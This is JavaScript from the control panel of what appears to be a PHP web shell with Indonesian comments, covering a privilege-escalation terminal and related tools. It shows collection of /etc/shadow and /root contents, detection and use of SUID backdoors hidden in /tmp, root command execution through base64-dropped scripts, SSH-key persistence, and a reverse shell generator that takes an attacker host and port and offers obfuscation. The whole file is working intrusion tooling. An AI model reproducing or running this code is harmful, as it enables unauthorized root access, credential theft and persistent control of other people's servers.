<span class="text-white">   ${window.lastCollectedSummary || 'Data collected'}</span>

<span class="text-secondary">📁 COLLECTED CATEGORIES:</span>`;
        
        const categories = window.lastCollectedRootData;
        if (categories.identity) html += `\n<span class="text-primary">   ✓ Identity (id, whoami, hostname)</span>`;
        if (categories.passwords?.etc_shadow?.includes(':')) {
            html += `\n<span class="text-primary">   ✓ /etc/shadow READABLE!</span>`;
        } else if (categories.passwords) {
            html += `\n<span class="text-white">   • /etc/passwd (users)</span>`;
        }
        if (categories.root_dir?.ls_la_root && !categories.root_dir.ls_la_root.includes('Permission denied')) {
            html += `\n<span class="text-primary">   ✓ /root/ directory accessible!</span>`;
        }
        if (categories.system) html += `\n<span class="text-white">   • System processes</span>`;
        if (categories.network) html += `\n<span class="text-white">   • Network info</span>`;
        if (categories.sensitive) html += `\n<span class="text-white">   • Sensitive files</span>`;
        
        html += `

<span class="text-secondary">💾 Data saved to:</span>
<span class="text-white">   ${(window.lastCollectedPaths || ['server']).join('\n   ')}</span>

<span class="text-warning">⚠️ PERSISTENCE WARNING:</span>
<span class="text-white">   SUID backdoor likely WON'T WORK due to:</span>
<span class="text-white">   • File owned by user (not root)</span>
<span class="text-white">   • Kernel protections (nosuid, Yama LSM)</span>
<span class="text-white">   • CloudLinux LVE restrictions</span>

<span class="text-secondary">📋 WHAT TO DO NOW:</span>
<span class="text-white">   1. ⬆️ Click "📥 Download Root Data" button ABOVE</span>
<span class="text-white">   2. 🔒 Click "Persist" to attempt SSH key backup</span>
<span class="text-white">   3. 📁 Check Shell tab for collected files</span>`;
    } else {
        // No auto-collect data (older exploit or manual)
        html += `
<span class="text-danger">❌ NO AUTO-COLLECT DATA</span>
<span class="text-white">   Auto-collect may have failed or not triggered.</span>

<span class="text-secondary">📋 WHAT TO DO NOW:</span>
<span class="text-white">   1. 🔒 Click "Persist" button to attempt backup</span>
<span class="text-white">   2. 🐚 Try manual commands in Shell tab</span>`;
    }

    html += `

<span class="text-muted">═══════════════════════════════════════</span>
<span class="text-secondary">📝 TERMINAL INPUT (may NOT have root):</span>`;

    output.innerHTML = html;
    
    // Auto-focus input
    document.getElementById('rootTerminalInput').focus();
    
    rootTerminalActive = true;
    suidBackdoorPath = null; // Reset path
    
    // 🎯 Enable download button if we have auto-collect data
    const downloadBtn = document.getElementById('downloadRootDataBtn');
    if (downloadBtn && hasAutoCollect) {
        downloadBtn.disabled = false;
        downloadBtn.style.opacity = '1';
        downloadBtn.title = 'Download collected root data';
    }
    
    // Check if persistence already installed (but don't show misleading success)
    checkSuidBackdoor();
}

// Cek apakah SUID backdoor sudah terinstall
async function checkSuidBackdoor() {
    // Cek juga di hasil persist yang mungkin baru selesai
    const commonPaths = ['/tmp/.sysd', '/tmp/.hidden_root', '/tmp/.bash', '/dev/shm/.sysd', '/tmp/.al-sysd'];
    const output = document.getElementById('rootTerminalOutput');
    
    for (const path of commonPaths) {
        try {
            const formData = new FormData();
            formData.append('cmd', 'ls -la ' + path + ' 2>/dev/null');
            formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            
            const response = await fetch('', { method: 'POST', body: formData });
            const html = await response.text();
            
            // Parse output properly
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const outputEl = doc.querySelector('.output');
            const result = outputEl ? outputEl.textContent : '';
            
            // Check: must be owned by root AND have SUID bit
            // Example: -rwsr-xr-x 1 root root
            const hasRootOwner = result.includes('root');
            const hasSuidBit = /rws/.test(result); // s bit di owner execute position
            const hasFile = result.includes(path.split('/').pop());
            const notFound = result.includes('No such file') || result.includes('not found') || result.includes('cannot access');
            
            console.log('[RootTerminal] Checking', path, 'Result:', result.substring(0, 150));
            console.log('[RootTerminal]   hasRoot:', hasRootOwner, 'hasSUID:', hasSuidBit, 'hasFile:', hasFile, 'notFound:', notFound);
            
            if (hasRootOwner && hasSuidBit && hasFile && !notFound) {
                // 🎯 VALID SUID: owned by root AND has SUID bit
                suidBackdoorPath = path;
                updateTerminalStatus('✅ SUID found (owned by root) - try: ' + path + ' -c id', '#0f0');
                
                output.innerHTML += `\n<span class="text-primary font-bold">✅ SUID BACKDOOR DETECTED (ROOT OWNED)!</span>
<span class="text-primary">   Path: ${path}</span>
<span class="text-secondary">   This might work! Test in Shell tab:</span>
<span style="color:#0f0;background:#000;padding:3px 8px;border:1px solid #0f0;display:inline-block;margin:5px 0;">${path} -c "id"</span>
<span class="text-warning">   ⚠️ If "Permission denied", kernel is blocking SUID</span>\n`;
                output.scrollTop = output.scrollHeight;
                return;
            } else if (hasFile && hasSuidBit && !notFound) {
                // 🚫 INVALID SUID: has SUID bit but NOT owned by root (useless!)
                console.log('[RootTerminal] Found SUID file but NOT owned by root:', path);
                // Don't set suidBackdoorPath - it won't work
            }
        } catch (e) {
            console.log('[RootTerminal] Error checking', path, e);
        }
    }
    
    // No valid SUID backdoor found
    updateTerminalStatus('⚠️ No working SUID backdoor found. Use auto-collect data.', '#f80');
}

// Update status terminal
function updateTerminalStatus(msg, color) {
    const status = document.getElementById('rootTerminalStatus');
    status.textContent = msg;
    status.style.color = color;
}

// Execute command via root terminal
async function executeRootCommand() {
    const input = document.getElementById('rootTerminalInput');
    const output = document.getElementById('rootTerminalOutput');
    const cmd = input.value.trim();
    
    if (!cmd) return;
    
    // Add command to output
    output.innerHTML += '\n<span class="text-primary">root@server# ' + escapeHtml(cmd) + '</span>\n';
    
    // Add loading indicator
    const loadingId = 'loading_' + Date.now();
    output.innerHTML += '<span id="' + loadingId + '" class="text-muted">⏳ Executing...</span>';
    output.scrollTop = output.scrollHeight;
    input.value = '';
    
    // Check if we have SUID backdoor
    if (!suidBackdoorPath) {
        await checkSuidBackdoor();
    }
    
    // Execute command
    try {
        if (suidBackdoorPath) {
            // 🎯 SOLUSI: Gunakan script file + SUID shell dengan argument
            // Method: /tmp/.hidden_root /tmp/script.sh
            const scriptFile = '/tmp/.al_' + Date.now() + '.sh';
            
            // Step 1: Create script file
            const scriptContent = '#!/bin/sh\n' + cmd + '\n';
            const createCmd = 'echo "' + btoa(scriptContent) + '" | base64 -d > ' + scriptFile + ' && chmod 755 ' + scriptFile;
            
            console.log('[RootTerminal] Creating script:', scriptFile);
            
            const formData1 = new FormData();
            formData1.append('cmd', createCmd);
            formData1.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            await fetch('', { method: 'POST', body: formData1 });
            
            // Step 2: Execute script dengan SUID shell sebagai argument
            // Cara ini lebih reliable daripada pipe atau redirect
            const execCmd = suidBackdoorPath + ' ' + scriptFile + ' 2>&1; echo "[EXITCODE:$?]"; rm -f ' + scriptFile;
            
            console.log('[RootTerminal] Executing:', execCmd);
            
            const formData2 = new FormData();
            formData2.append('cmd', execCmd);
            formData2.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            
            const response = await fetch('', { method: 'POST', body: formData2 });
            const html = await response.text();
            
            // Remove loading indicator
            const loadingEl = document.getElementById(loadingId);
            if (loadingEl) loadingEl.remove();
            
            // Parse output
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const outputEl = doc.querySelector('.output');
            
            if (outputEl) {
                let result = outputEl.textContent.trim();
                console.log('[RootTerminal] Output:', result.substring(0, 100));
                
                // Check if ran as root
                const isRoot = result.includes('uid=0(root)') || 
                               (result.includes('root') && !result.includes('www-data') && !result.includes('uid=33'));
                
                if (!isRoot && (result.includes('www-data') || result.includes('uid=33'))) {
                    output.innerHTML += '\n<span class="text-danger font-bold">⚠️ SUID NOT WORKING - KERNEL PROTECTION</span>\n\n';
                    output.innerHTML += '<span class="text-warning">The SUID binary exists but kernel is blocking it.</span>\n';
                    output.innerHTML += '<span class="text-white">Possible causes: nosuid mount, Yama LSM, or other kernel hardening.</span>\n\n';
                    output.innerHTML += '<span class="text-secondary">✅ WORKAROUND - Use Main Shell Tab:</span>\n\n';
                    output.innerHTML += '<span class="text-white">1. CLOSE this Privilege Escalation modal</span>\n';
                    output.innerHTML += '<span class="text-white">2. Go to main "Shell" tab (top menu)</span>\n';
                    output.innerHTML += '<span class="text-white">3. Run this exact command:</span>\n\n';
                    output.innerHTML += '<div style="background:#000;border:2px solid #0f0;padding:10px;margin:10px 0;font-family:monospace;font-size:14px;">';
                    output.innerHTML += '<span class="text-primary">' + suidBackdoorPath + ' -c "' + escapeHtml(cmd) + '"</span>';
                    output.innerHTML += '</div>\n\n';
                    output.innerHTML += '<span class="text-warning">If still www-data, the SUID backdoor is NOT functional.</span>\n';
                    output.innerHTML += '<span class="text-muted">You may need to use the exploit directly each time.</span>\n';
                } else {
                    output.innerHTML += '<span class="text-white">' + escapeHtml(result) + '</span>\n';
                }
            } else {
                output.innerHTML += '<span class="text-danger">[Error: Could not parse output]</span>\n';
            }
        } else {
            // No SUID backdoor
            const loadingEl = document.getElementById(loadingId);
            if (loadingEl) loadingEl.remove();
            
            output.innerHTML += '\n<span class="text-danger font-bold">❌ SUID BACKDOOR NOT FOUND!</span>\n';
            output.innerHTML += '<span class="text-warning">💡 Install persistence first.</span>\n\n';
            updateTerminalStatus('⚠️ Click 🔒 Persist button above!', '#f44');
        }
        
    } catch (err) {
        const loadingEl = document.getElementById(loadingId);
        if (loadingEl) loadingEl.remove();
        output.innerHTML += '<span class="text-danger">Error: ' + escapeHtml(err.message) + '</span>\n';
    }
    
    output.scrollTop = output.scrollHeight;
}

// Handle persistence installation from terminal (redirect to main persist function)
async function installQuickPersist() {
    const output = document.getElementById('rootTerminalOutput');
    output.innerHTML += '<span class="text-secondary"># Redirecting to full persistence installer...</span>\n';
    output.innerHTML += '<span class="text-warning"># Please click the 🔒 Persist button in the button row above.</span>\n';
    updateTerminalStatus('⚠️ Click 🔒 Persist button above', '#f80');
}

// Get exploit wrapper command (fallback jika tidak ada SUID backdoor)
async function getExploitWrapperCmd(cmd) {
    // Untuk sekarang return command biasa dengan warning
    return cmd;
}

// Escape HTML helper
function escapeHtml(text) {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

/* ========== Original Functions - Block 2 ========== */
// ============================================================================
// Feature 1: Crontab Editor Functions
// ============================================================================

function loadCronJobs() {
    fetch('?masuk=al&action=crontab_list')
        .then(r => r.json())
        .then(data => {
            let html = '<pre>';
            if (data.entries && data.entries.length > 0) {
                data.entries.forEach(entry => {
                    html += `${entry.command}\n`;
                });
            } else {
                html += 'No cron jobs found';
            }
            html += '</pre>';
            document.getElementById('cronList').innerHTML = html;
        })
        .catch(e => document.getElementById('cronList').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function addCronJob() {
    const data = new FormData();
    data.append('minute', document.getElementById('cronMinute').value || '*');
    data.append('hour', document.getElementById('cronHour').value || '*');
    data.append('day_of_month', document.getElementById('cronDay').value || '*');
    data.append('month', document.getElementById('cronMonth').value || '*');
    data.append('day_of_week', document.getElementById('cronDOW').value || '*');
    data.append('command', document.getElementById('cronCmd').value);

    fetch('?masuk=al&action=crontab_add', {method: 'POST', body: data})
        .then(r => r.json())
        .then(data => {
            const output = document.getElementById('cronOutput');
            output.style.display = 'block';
            output.innerHTML = '<pre>' + (data.success ? 'Cron job added successfully' : 'Error: ' + data.error) + '</pre>';
            if (data.success) loadCronJobs();
        })
        .catch(e => {
            const output = document.getElementById('cronOutput');
            output.style.display = 'block';
            output.innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>';
        });
}

// ============================================================================
// Feature 2: Firewall Checker Functions
// ============================================================================

function checkFirewallStatus() {
    fetch('?masuk=al&action=firewall_status')
        .then(r => r.json())
        .then(data => {
            document.getElementById('firewallOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('firewallOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function checkFirewallRules() {
    fetch('?masuk=al&action=firewall_rules')
        .then(r => r.json())
        .then(data => {
            document.getElementById('firewallOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('firewallOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function checkFirewallInfo() {
    fetch('?masuk=al&action=firewall_info')
        .then(r => r.json())
        .then(data => {
            document.getElementById('firewallOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('firewallOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

// ============================================================================
// Feature 3: Hash Calculator Functions
// ============================================================================

function hashText() {
    const text = document.getElementById('hashText').value;
    const algo = document.getElementById('hashAlgorithm').value;

    if (!text) {
        document.getElementById('hashOutput').innerHTML = '<pre class="text-danger">Enter text to hash</pre>';
        return;
    }

    const data = new FormData();
    data.append('text', text);
    data.append('algorithm', algo);

    fetch('?masuk=al&action=hash_text', {method: 'POST', body: data})
        .then(r => r.json())
        .then(data => {
            document.getElementById('hashOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('hashOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function hashFile() {
    const file = document.getElementById('hashFile').value;
    const algo = document.getElementById('hashAlgorithm').value;

    if (!file) {
        document.getElementById('hashOutput').innerHTML = '<pre class="text-danger">Enter file path</pre>';
        return;
    }

    const data = new FormData();
    data.append('filepath', file);
    data.append('algorithm', algo);

    fetch('?masuk=al&action=hash_file', {method: 'POST', body: data})
        .then(r => r.json())
        .then(data => {
            document.getElementById('hashOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('hashOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function compareHashes() {
    const h1 = document.getElementById('hash1').value;
    const h2 = document.getElementById('hash2').value;

    if (!h1 || !h2) {
        document.getElementById('hashOutput').innerHTML = '<pre class="text-danger">Enter both hashes</pre>';
        return;
    }

    const data = new FormData();
    data.append('hash1', h1);
    data.append('hash2', h2);

    fetch('?masuk=al&action=hash_compare', {method: 'POST', body: data})
        .then(r => r.json())
        .then(data => {
            document.getElementById('hashOutput').innerHTML = '<pre>' + (data.match ? 'MATCH ✓' : 'NO MATCH ✗') + '\n\n' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('hashOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

// ============================================================================
// Feature 4: Kernel Protection Checker Functions
// ============================================================================

function checkAllProtections() {
    fetch('?masuk=al&action=kernel_protections')
        .then(r => r.json())
        .then(data => {
            document.getElementById('kernelOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('kernelOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function checkASLR() {
    fetch('?masuk=al&action=kernel_aslr')
        .then(r => r.json())
        .then(data => {
            document.getElementById('kernelOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('kernelOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function checkSELinux() {
    fetch('?masuk=al&action=kernel_selinux')
        .then(r => r.json())
        .then(data => {
            document.getElementById('kernelOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('kernelOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

// ============================================================================
// Feature 5: Logs Viewer Functions
// ============================================================================

function listLogFiles() {
    fetch('?masuk=al&action=logs_list')
        .then(r => r.json())
        .then(data => {
            let html = '<div class="p-5">';
            if (data.logs && data.logs.length > 0) {
                data.logs.forEach(log => {
                    html += `<div class="p-5 border-b border-gray cursor-pointer" onclick="readLogFile('${log.path}')">${log.path}</div>`;
                });
            } else {
                html += 'No log files found';
            }
            html += '</div>';
            document.getElementById('logsList').innerHTML = html;
        })
        .catch(e => document.getElementById('logsList').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function readLogs() {
    const file = document.getElementById('logFile').value;
    const lines = document.getElementById('logLines').value || 100;

    if (!file) {
        document.getElementById('logsOutput').innerHTML = 'Enter log file path';
        return;
    }

    fetch(`?masuk=al&action=logs_read&file=${encodeURIComponent(file)}&lines=${lines}`)
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                document.getElementById('logsOutput').innerHTML = '<pre>' + data.content + '</pre>';
            } else {
                document.getElementById('logsOutput').innerHTML = '<pre class="text-danger">Error: ' + data.error + '</pre>';
            }
        })
        .catch(e => document.getElementById('logsOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function readLogFile(filepath) {
    document.getElementById('logFile').value = filepath;
    readLogs();
}

// ============================================================================
// Feature 6: Permission Tracker Functions
// ============================================================================

function checkFilePermissions() {
    const file = document.getElementById('permFile').value;

    if (!file) {
        document.getElementById('permOutput').innerHTML = 'Enter file path';
        return;
    }

    const data = new FormData();
    data.append('filepath', file);

    fetch('?masuk=al&action=perm_check_file', {method: 'POST', body: data})
        .then(r => r.json())
        .then(data => {
            document.getElementById('permOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('permOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function findDeniedErrors() {
    const dir = document.getElementById('permDir').value || '/';

    const data = new FormData();
    data.append('directory', dir);

    fetch('?masuk=al&action=perm_find_denied', {method: 'POST', body: data})
        .then(r => r.json())
        .then(data => {
            document.getElementById('permOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('permOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

// ============================================================================
// Feature 7: Port Scanner Functions
// ============================================================================

function scanPorts() {
    const host = document.getElementById('portHost').value || 'localhost';
    const ports = document.getElementById('portRange').value || '1-1024';

    const data = new FormData();
    data.append('host', host);
    data.append('ports', ports);

    fetch('?masuk=al&action=port_scan', {method: 'POST', body: data})
        .then(r => r.json())
        .then(data => {
            document.getElementById('portOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('portOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function scanCommonPorts() {
    fetch('?masuk=al&action=port_common')
        .then(r => r.json())
        .then(data => {
            document.getElementById('portOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('portOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function listOpenPorts() {
    fetch('?masuk=al&action=port_list')
        .then(r => r.json())
        .then(data => {
            document.getElementById('portOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('portOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

// ============================================================================
// Feature 8: SSH Key Generator Functions
// ============================================================================

function generateSSHKey() {
    const keyType = document.getElementById('sshKeyType').value;
    const email = document.getElementById('sshEmail').value || 'user@example.com';
    const passphrase = document.getElementById('sshPassphrase').value;

    const data = new FormData();
    data.append('key_type', keyType);
    data.append('email', email);
    data.append('passphrase', passphrase);

    fetch('?masuk=al&action=ssh_generate', {method: 'POST', body: data})
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                document.getElementById('sshPublic').value = data.public_key;
                document.getElementById('sshPrivate').value = data.private_key;
            } else {
                alert('Error: ' + data.error);
            }
        })
        .catch(e => alert('Error: ' + e.message));
}

function copySSHPublic() {
    const text = document.getElementById('sshPublic').value;
    if (text) {
        navigator.clipboard.writeText(text).then(() => alert('Public key copied'));
    }
}

function copySSHPrivate() {
    const text = document.getElementById('sshPrivate').value;
    if (text) {
        navigator.clipboard.writeText(text).then(() => alert('Private key copied'));
    }
}

// ============================================================================
// Feature 9: SUID/SGID Scanner Functions
// ============================================================================

function scanSUID() {
    fetch('?masuk=al&action=suid_scan')
        .then(r => r.json())
        .then(data => {
            document.getElementById('suidOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('suidOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function scanSGID() {
    fetch('?masuk=al&action=sgid_scan')
        .then(r => r.json())
        .then(data => {
            document.getElementById('suidOutput').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('suidOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

function scanSUIDandSGID() {
    fetch('?masuk=al&action=suid_sgid_all')
        .then(r => r.json())
        .then(data => {
            document.getElementById('suidOutput').innerHTML = '<pre>SUID Count: ' + data.suid_count + '\nSGID Count: ' + data.sgid_count + '\n\n' + JSON.stringify(data, null, 2) + '</pre>';
        })
        .catch(e => document.getElementById('suidOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

// ============================================================================
// Feature 10: Session Manager Functions
// ============================================================================

function loadSessionInfo() {
    fetch('?masuk=al&action=session_info')
        .then(r => r.json())
        .then(data => {
            document.getElementById('sessionInfo').innerHTML = 'Session ID: ' + (data.session_id || 'N/A') + '\nTimeout: ' + data.session_timeout + 's\nLast Activity: ' + new Date(data.last_activity * 1000).toLocaleString();
        })
        .catch(e => document.getElementById('sessionInfo').innerHTML = 'Error: ' + e.message);
}

function extendSession() {
    fetch('?masuk=al&action=session_extend')
        .then(r => r.json())
        .then(data => {
            document.getElementById('sessionOutput').innerHTML = '<pre class="text-primary">✓ ' + data.message + '\nTimestamp: ' + new Date().toLocaleString() + '</pre>';
            loadSessionInfo();
        })
        .catch(e => document.getElementById('sessionOutput').innerHTML = '<pre class="text-danger">Error: ' + e.message + '</pre>');
}

// ============================================================================
// Helper Functions
// ============================================================================


// ============================================================================
// REVERSE SHELL GENERATOR - JavaScript Functions
// ============================================================================

function updateRSOptions() {
    const shellType = document.getElementById('rsShellType').value;
    const ncOptions = document.getElementById('rsNcOptions');
    if (shellType === 'nc') {
        ncOptions.style.display = 'block';
    } else {
        ncOptions.style.display = 'none';
    }
}

async function generateReverseShellPayload() {
    const lhost = document.getElementById('rsAttackerHost').value.trim();
    const lport = document.getElementById('rsAttackerPort').value.trim();
    const shellType = document.getElementById('rsShellType').value;
    const encoding = document.getElementById('rsEncoding').value;
    const obfuscate = document.getElementById('rsObfuscate').checked;
    const errorDiv = document.getElementById('rsError');

    if (!lhost) {
        errorDiv.textContent = 'Please enter attacker IP or hostname';
        errorDiv.style.display = 'block';
        return;
    }

    if (!lport || lport < 1 || lport > 65535) {
        errorDiv.textContent = 'Please enter valid port (1-65535)';
        errorDiv.style.display = 'block';
        return;
    }

    try {
        const formData = new FormData();
        formData.append('lhost', lhost);
        formData.append('lport', lport);
        formData.append('shell_type', shellType);
        formData.append('encoding', encoding);
        formData.append('obfuscate', obfuscate ? 1 : 0);

        if (shellType === 'nc') {
            formData.append('nc_type', document.getElementById('rsNcType').value);
        }

        const response = await fetch('?masuk=al&action=revshell_generate', {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        if (data.error) {
            errorDiv.textContent = 'Error: ' + data.error;
            errorDiv.style.display = 'block';
            return;
        }

        document.getElementById('rsOriginalPayload').textContent = data.original;
        document.getElementById('rsOutputTabs').style.display = 'block';
        errorDiv.style.display = 'none';

        if (data.encoded !== data.original) {
            document.getElementById('rsEncodedPayload').textContent = data.encoded;
            document.getElementById('rsEncodedTabBtn').style.display = 'block';
        } else {
            document.getElementById('rsEncodedTabBtn').style.display = 'none';
        }

    } catch (error) {
        errorDiv.textContent = 'Error: ' + error.message;
        errorDiv.style.display = 'block';
    }
}

function switchRSTab(tabName) {
    document.querySelectorAll('.rs-tab-content').forEach(el => {
        el.style.display = 'none';
    });
    document.querySelectorAll('.rs-tab-btn').forEach(btn => {
        btn.style.color = '#666';
        btn.style.borderBottom = '2px solid transparent';
    });

    if (tabName === 'original') {
        document.getElementById('rsOriginalPayload').style.display = 'block';
        document.querySelector('[onclick*="switchRSTab(\'original\')"]').style.color = '#0f0';
        document.querySelector('[onclick*="switchRSTab(\'original\')"]').style.borderBottom = '2px solid #0f0';
    } else {
        document.getElementById('rsEncodedPayload').style.display = 'block';
        document.querySelector('[onclick*="switchRSTab(\'encoded\')"]').style.color = '#0f0';
        document.querySelector('[onclick*="switchRSTab(\'encoded\')"]').style.borderBottom = '2px solid #0f0';
    }
}

async function generateReverseShellListener() {
    const lhost = document.getElementById('rsAttackerHost').value.trim();
    const lport = document.getElementById('rsListenerPort').value.trim();
    const listenerType = document.getElementById('rsListenerType').value;
    const errorDiv = document.getElementById('rsError');

    if (!lhost || !lport) {
        errorDiv.textContent = 'Please configure attacker IP and port';
        errorDiv.style.display = 'block';
        return;
    }

    try {
        const formData = new FormData();
        formData.append('listener_type', listenerType);
        formData.append('listener_port', lport);

        const response = await fetch('?masuk=al&action=revshell_listener', {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        if (data.error) {
            errorDiv.textContent = 'Error: ' + data.error;
            errorDiv.style.display = 'block';
            return;
        }

        document.getElementById('rsListenerOutput').textContent = data.command;
        document.getElementById('rsListenerOutput').style.display = 'block';
        document.getElementById('rsCopyListenerBtn').style.display = 'block';
        errorDiv.style.display = 'none';

    } catch (error) {
        errorDiv.textContent = 'Error: ' + error.message;
        errorDiv.style.display = 'block';
    }
}

async function decodeReverseShellPayload() {
    const payload = document.getElementById('rsDecodeInput').value.trim();
    const decodeType = document.getElementById('rsDecodeType').value;
    const errorDiv = document.getElementById('rsError');

    if (!payload) {
        errorDiv.textContent = 'Please paste encoded payload';
        errorDiv.style.display = 'block';
        return;
    }

    try {
        const formData = new FormData();
        formData.append('payload', payload);
        formData.append('encoding_type', decodeType);

        const response = await fetch('?masuk=al&action=revshell_decode', {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        if (data.error) {
            errorDiv.textContent = 'Error: ' + data.error;
            errorDiv.style.display = 'block';
            return;
        }

        document.getElementById('rsDecodeOutput').textContent = data.decoded || 'Failed to decode';
        document.getElementById('rsDecodeOutput').style.display = 'block';
        document.getElementById('rsCopyDecodeBtn').style.display = 'block';
        errorDiv.style.display = 'none';

    } catch (error) {
        errorDiv.textContent = 'Error: ' + error.message;
        errorDiv.style.display = 'block';
    }
}

function copyToClipboardRS(elementId) {
    const element = document.getElementById(elementId);
    const text = element.textContent;

    navigator.clipboard.writeText(text).then(() => {
        const btn = event.target;
        const origText = btn.textContent;
        btn.textContent = '✓ Copied!';
        btn.style.background = '#0f0';
        setTimeout(() => {
            btn.textContent = origText;
            btn.style.background = '#6cf';
        }, 2000);
    }).catch(err => {
        alert('Failed to copy: ' + err);
    });
}

// ============================================================================
// SERVICE MANAGER - JavaScript Functions
// ============================================================================

let serviceFilterStatus = 'all';
let allServices = [];

function loadServiceList() {
    const container = document.getElementById('serviceListContainer');
    container.innerHTML = '<div class="text-center text-white p-10">Loading services...</div>';

    fetch('?masuk=al&action=service_list')
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                allServices = data.data || [];
                renderServicesList();
                document.getElementById('serviceError').style.display = 'none';
            } else {
                throw new Error(data.error || 'Failed to load services');
            }
        })
        .catch(error => {
            const errorDiv = document.getElementById('serviceError');
            errorDiv.textContent = 'Error: ' + error.message;
            errorDiv.style.display = 'block';
            container.innerHTML = '<div class="text-center text-red p-20">Failed to load services</div>';
        });
}

function renderServicesList() {
    const searchTerm = document.getElementById('serviceSearchInput').value.toLowerCase();
    const container = document.getElementById('serviceListContainer');

    let filteredServices = allServices.filter(service => {
        const matchesSearch = service.name.toLowerCase().includes(searchTerm) ||
                             (service.description || '').toLowerCase().includes(searchTerm);
        const matchesFilter = serviceFilterStatus === 'all' ||
                            (serviceFilterStatus === 'active' && (service.active === true || service.status === 'Running')) ||
                            (serviceFilterStatus === 'inactive' && service.active === false && service.sub !== 'failed');
        return matchesSearch && matchesFilter;
    });

    if (filteredServices.length === 0) {
        container.innerHTML = '<div class="text-center text-white p-10">No services found</div>';
        return;
    }

    let html = '<div class="text-md whitespace-pre-wrap">';
    filteredServices.forEach(service => {
        const isActive = service.active === true || service.status === 'Running';
        const statusColor = isActive ? '#0f0' : '#f44';
        const statusText = isActive ? 'RUNNING' : 'STOPPED';

        html += `<div class="border border-dark p-10 mb-10 bg-dark">
            <div class="flex justify-between items-center mb-8">
                <span class="text-secondary font-bold">${service.name}</span>
                <span style="color: ${statusColor}; font-weight: bold;">${statusText}</span>
            </div>
            <div class="text-muted mb-8 text-11">${service.description || 'No description'}</div>
            <div class="flex gap-5 flex-wrap">
                ${!isActive ? `<button onclick="serviceAction('${service.name}', 'start')" class="flex-1 min-w-70 bg-green text-dark border-0 p-4 cursor-pointer text-11">Start</button>` : `<button onclick="serviceAction('${service.name}', 'stop')" class="flex-1 min-w-70 bg-red text-white border-0 p-4 cursor-pointer text-11">Stop</button>`}
                <button onclick="serviceAction('${service.name}', 'restart')" class="flex-1 min-w-70 bg-gray text-green border-0 p-4 cursor-pointer text-11">Restart</button>
                <button onclick="viewServiceLogs('${service.name}')" class="flex-1 min-w-70 bg-cyan text-dark border-0 p-4 cursor-pointer text-11">Logs</button>
            </div>
        </div>`;
    });
    html += '</div>';

    container.innerHTML = html;
}

function serviceFilterAll() {
    serviceFilterStatus = 'all';
    updateServiceFilterButtons();
    renderServicesList();
}

function serviceFilterActive() {
    serviceFilterStatus = 'active';
    updateServiceFilterButtons();
    renderServicesList();
}

function serviceFilterInactive() {
    serviceFilterStatus = 'inactive';
    updateServiceFilterButtons();
